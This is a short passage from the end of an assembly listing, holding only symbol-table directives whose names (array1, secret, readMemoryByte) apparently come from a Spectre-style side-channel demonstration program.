	.addrsig_sym __isoc99_sscanf
	.addrsig_sym getpid
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym secret
	.addrsig_sym temp
	.addrsig_sym array2
	.addrsig_sym readMemoryByte.results
